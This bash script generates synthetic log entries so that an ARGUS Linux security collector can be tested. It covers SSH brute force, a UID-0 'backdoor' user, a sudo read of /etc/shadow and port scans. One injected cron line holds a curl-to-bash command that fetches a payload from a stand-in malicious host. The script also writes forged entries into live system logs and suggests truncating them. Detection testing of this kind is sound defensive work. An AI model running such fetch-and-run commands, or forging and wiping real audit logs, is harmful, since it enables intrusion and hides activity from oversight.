#!/bin/bash
# test_events.sh
# Generates test events for ARGUS Linux collectors.
# Run with: sudo ./test_events.sh

set -e

AUTH_LOG="/var/log/auth.log"
KERN_LOG="/var/log/kern.log"
SYSLOG="/var/log/syslog"
TIMESTAMP=$(date '+%b %d %H:%M:%S')

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

section() {
    echo ""
    echo -e "${GREEN}=== $1 ===${NC}"
}

info() {
    echo -e "${YELLOW}[*]${NC} $1"
}

# Check prerequisites
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Please run with sudo${NC}"
    exit 1
fi

# Ensure log files exist (some distros don't have them)
for log in "$AUTH_LOG" "$KERN_LOG" "$SYSLOG"; do
    if [ ! -f "$log" ]; then
        info "Creating $log (didn't exist)"
        touch "$log"
        chmod 640 "$log"
    fi
done

section "1. Brute Force by IP (5 failures from same IP)"
info "Triggering 5 failed SSH logins from 192.0.2.45..."
for i in 1 2 3 4 5; do
    echo "$TIMESTAMP myhost sshd[1234]: Failed password for invalid user admin from 192.0.2.45 port 22 ssh2" >> "$AUTH_LOG"
    sleep 1
done
info "Should trigger: BRUTE_FORCE_BY_IP alert"

section "2. Brute Force by User (5 failures on root)"
info "Triggering 5 failed SSH logins for root from different IPs..."
for i in 1 2 3 4 5; do
    IP="10.0.0.$i"
    echo "$TIMESTAMP myhost sshd[1234]: Failed password for root from $IP port 22 ssh2" >> "$AUTH_LOG"
    sleep 1
done
info "Should trigger: BRUTE_FORCE_BY_USER alert"

section "3. Successful Login After Failures"
info "Triggering a successful login..."
echo "$TIMESTAMP myhost sshd[1234]: Accepted password for admin from 192.0.2.45 port 22 ssh2" >> "$AUTH_LOG"
info "Critical pattern: successful login after brute force"

section "4. Sudo Failure"
info "Triggering sudo authentication failure..."
echo "$TIMESTAMP myhost sudo: pam_unix(sudo:auth): authentication failure; logname=alice uid=1000 tty=/dev/pts/0 user=alice" >> "$AUTH_LOG"
info "Should trigger: SUDO_FAILURE event"

section "5. Successful Sudo Command (Privilege Escalation)"
info "Triggering sudo command execution..."
echo "$TIMESTAMP myhost sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow" >> "$AUTH_LOG"
info "Sensitive command executed as root"

section "6. New User Created"
info "Triggering user creation..."
echo "$TIMESTAMP myhost useradd[5678]: new user: name=backdoor, UID=0, GID=0, home=/home/backdoor, shell=/bin/bash" >> "$AUTH_LOG"
info "Should trigger: USER_CREATED event (UID=0 is critical)"

section "7. Password Change"
info "Triggering password change..."
echo "$TIMESTAMP myhost passwd[9999]: pam_unix(passwd:chauthtok): password changed for alice" >> "$AUTH_LOG"

section "8. Firewall Port Scan (12 different ports from same IP)"
info "Triggering 12 blocked connections from 198.51.100.42..."
for port in 22 23 80 443 3389 445 6379 8080 9200 27017 21 3306; do
    echo "$TIMESTAMP myhost kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=198.51.100.42 DST=192.0.2.1 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12345 PROTO=TCP SPT=12345 DPT=$port WINDOW=29200 RES=0x00 SYN URGP=0" >> "$KERN_LOG"
    sleep 0.3
done
info "Should trigger: PORT_SCAN alert after 10+ unique ports"

section "9. Firewall Block on Suspicious Port"
info "Triggering block on Redis port (6379)..."
echo "$TIMESTAMP myhost kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.77 DST=192.0.2.1 PROTO=TCP SPT=44444 DPT=6379" >> "$KERN_LOG"
info "Should trigger: SUSPICIOUS_PORT_PROBE alert"

section "10. Firewall Allow (normal traffic)"
info "Triggering allowed HTTPS connection..."
echo "$TIMESTAMP myhost kernel: [UFW ALLOW] IN=eth0 OUT= SRC=192.0.2.1 DST=142.250.190.46 PROTO=TCP SPT=54321 DPT=443" >> "$KERN_LOG"

section "11. Systemd Service Stopped"
info "Triggering critical service stop..."
echo "$TIMESTAMP myhost systemd[1]: sshd.service: Deactivated successfully." >> "$SYSLOG"
info "Should trigger: CRITICAL_SERVICE_STOPPED alert"

section "12. OOM Kill"
info "Triggering out-of-memory kill..."
echo "$TIMESTAMP myhost kernel: Out of memory: Killed process 12345 (apache2) total-vm:524288kB, anon-rss:256000kB, file-rss:0kB, shmem-rss:0kB" >> "$KERN_LOG"
info "Should trigger: OOM_KILL event"

section "13. Cron Execution"
info "Triggering cron job execution..."
echo "$TIMESTAMP myhost CRON[8888]: (root) CMD (/usr/bin/curl http://malicious.example.com/payload.sh | bash)" >> "$SYSLOG"
info "Suspicious cron: piping curl to bash"

section "14. Invalid User Attempt"
info "Triggering invalid user login attempt..."
for i in 1 2 3; do
    echo "$TIMESTAMP myhost sshd[1234]: Invalid user oracle from 198.51.100.99" >> "$AUTH_LOG"
    sleep 0.5
done

section "Test Complete"
echo -e "${GREEN}All test events generated.${NC}"
echo ""
echo "Now check the output:"
echo "  tail -f /home/\$USER/projects/argus/logs/events.jsonl | python3 -m json.tool"
echo "  tail -f /home/\$USER/projects/argus/logs/alerts.jsonl | python3 -m json.tool"
echo ""
echo "Expected alerts:"
echo "  - BRUTE_FORCE_BY_IP (from step 1)"
echo "  - BRUTE_FORCE_BY_USER (from step 2)"
echo "  - SUDO_FAILURE (from step 4)"
echo "  - USER_CREATED (from step 6)"
echo "  - PORT_SCAN (from step 8)"
echo "  - SUSPICIOUS_PORT_PROBE (from step 9)"
echo "  - CRITICAL_SERVICE_STOPPED (from step 11)"
echo "  - OOM_KILL (from step 12)"
echo ""
echo "To reset and test again:"
echo "  sudo truncate -s 0 /var/log/auth.log /var/log/kern.log /var/log/syslog"
echo "  rm -f /home/\$USER/projects/argus/logs/*.jsonl"
